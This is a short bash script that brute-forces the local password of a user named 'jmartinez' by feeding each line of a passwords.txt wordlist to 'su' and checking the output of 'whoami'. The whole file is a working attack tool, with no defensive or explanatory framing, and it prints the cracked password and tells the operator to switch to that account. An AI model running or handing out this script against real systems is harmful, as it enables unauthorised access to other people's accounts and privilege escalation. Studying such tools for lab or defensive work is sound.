#!/bin/bash
USER="jmartinez"
PASSWORD_FILE="passwords.txt"

if [[ ! -f "${PASSWORD_FILE}" ]]; then
  echo "password file does not exist."
  exit 1
fi

while read -r password; do
  echo "Attempting password: ${password} against ${USER}..."
  if echo "${password}" | timeout 0.2 su - ${USER} -c 'whoami' | grep -q "${USER}"; then
    echo
    echo "SUCCESS! The password for ${USER} is ${password}"
    echo "Use su - ${USER} and provide the password to switch"
    exit 0
  fi
done < "${PASSWORD_FILE}"

echo "Unable to compromise ${USER}."
exit 1
